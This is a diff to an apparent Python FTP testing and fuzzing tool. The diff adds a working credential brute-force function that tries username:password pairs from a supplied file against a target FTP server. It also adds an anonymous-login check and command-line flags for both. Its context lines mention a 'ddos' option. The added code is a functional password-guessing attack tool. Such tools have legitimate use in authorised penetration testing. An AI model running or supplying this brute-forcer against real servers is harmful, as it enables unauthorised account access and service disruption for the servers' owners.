@@ -8,6 +8,49 @@ import time
 from helper import *
 
 
+def brute_force_login(host, port, input_list):
+    for line in input_list:
+        cred = line.split(":")
+        try:
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.settimeout(10)
+            connect = s.connect((host,port))
+            time.sleep(0.1)
+            output = s.recv(1024)
+            time.sleep(0.1)
+            s.send(("USER {}\r\n".format(cred[0])).encode('utf-8'))
+            output = s.recv(1024)
+            time.sleep(0.1)
+            s.send(("PASS {}\r\n".format(cred[1])).encode('utf-8'))
+            output = s.recv(1024)
+            time.sleep(0.1)
+            if '230 Login successful' in output.decode('utf-8'):
+                print("Login brute forced: {}:{}".format(cred[0], cred[1]))
+                return 0
+        except socket.error as e:
+            print("Caught exception socket.error: {}".format(e))
+
+
+def anonymous_login(host, port):
+    print("Trying to connect to specified {}:{} via anonymous login.".format(host, port))
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.settimeout(10)
+        connect = s.connect((host,port))
+        time.sleep(0.1)
+        output = s.recv(1024)
+        time.sleep(0.1)
+        s.send(("USER anonymous\r\n").encode('utf-8'))		
+        output = s.recv(1024)
+        time.sleep(0.1)
+        s.send(("PASS password\r\n").encode('utf-8'))	
+        output = s.recv(1024)
+        time.sleep(0.1)
+        print("Anonymous login detected.") if '230 Login successful' in output.decode('utf-8') else print("Unable to connect via anonymous login.")
+    except socket.error as e:
+        print("Caught exception socket.error: {}".format(e))
+
+
 def fuzzFileAccess(host, port):
     pdf_file = "TestPdf.pdf"
     rtf_file = "TestRtf.rtf"
@@ -134,10 +177,25 @@ def main():
                         dest='commandsNoArgs',
                         help='Execute many FTP commands without arguments.'
     )
+    parser.add_argument('--anonym',
+                        action='store_true',
+                        dest='anonymous_login',
+                        help='Tries to login using anonymous login.'
+    )
+
+    parser.add_argument('--brute-force',
+                        dest='brute_force',
+                        help='Takes additional argument with a list containig usernames and passwords containing the following format "username:password".',
+                        type=argparse.FileType('r')
+    )
     args = parser.parse_args()
 
     if args.fuzz_file_access:
         fuzzFileAccess(args.host, args.port)
+    if args.anonymous_login:
+        anonymous_login(args.host, args.port)
+    if args.brute_force:
+        brute_force_login(args.host, args.port, args.brute_force)
     if args.commandsNoArgs:
         commandsWithoutArguments(args.host, args.port)
     if hasattr(args, 'ddos'):
